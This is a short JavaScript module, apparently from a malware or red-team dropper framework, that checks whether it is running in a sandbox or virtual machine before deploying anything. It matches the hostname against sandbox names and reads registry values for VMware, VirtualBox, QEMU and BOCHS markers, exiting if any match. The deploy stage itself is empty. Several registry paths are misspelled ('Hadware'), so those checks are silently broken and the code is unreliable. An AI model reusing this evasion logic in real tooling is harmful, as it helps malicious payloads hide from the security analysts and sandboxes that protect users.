// genesis script

function BeforeDeploy() {
    console.log("testing GetHostname!");
    host = (GetHost()).toUpperCase();
    console.log(host);
    if (host == "TEQUILABOOMBOOM" || host == "SANDBOX" || host == "VIRUS" || host == "MALWARE" || host == "MALTEST" || host == "PC") {
        console.log("Sandbox detected, exiting");
        return false;
    }

    console.log("testing RegKeys for Windows!");
    var VMWare_val = QueryRegKey("LM", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "VMWare User Process");
    if (VMWare_val == "\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr" ){
        console.log("VM detected, exiting");
        return false;
    }
    var VMWare_val2 = QueryRegKey("CU", "Software\\VMware, Inc.\\VMware Tools\\RegistryBackup\\DisplayScaling_DPI", "backupType");
    if (VMWare_val2 == "created" ){
        console.log("VM detected, exiting");
        return false;
    }
    var system_manu_val = QueryRegKey("LM", "Hadware\\Description\\System\\BIOS", "SystemManufacturer");
    if (system_manu_val == "VMware, Inc." ){
        console.log("VM detected, exiting");
        return false;
    }
    var system_product_val = QueryRegKey("LM", "Hadware\\Description\\System\\BIOS", "SystemProductName");
    if (system_product_val == "VMware Virtual Platform" ){
        console.log("VM detected, exiting");
        return false;
    }
    var vbox_val = QueryRegKey("LM", "Hadware\\Description\\System", "VideoBiosVersion");
    if (vbox_val == "VIRTUALBOX" ){
        console.log("VM detected, exiting");
        return false;
    }
    var key_val = QueryRegKey("LM", "Hadware\\Description\\System", "SystemBiosVersion");
    if (key_val == "VBOX" || key_val == "QEMU" || key_val == "BOCHS" ){
        console.log("VM detected, exiting");
        return false;
    }

    return true; 
}

function Deploy() {
  console.log("No Sandboxes / VMs Detected!");
  return true;
}

function AfterDeploy() {
  return true;
}


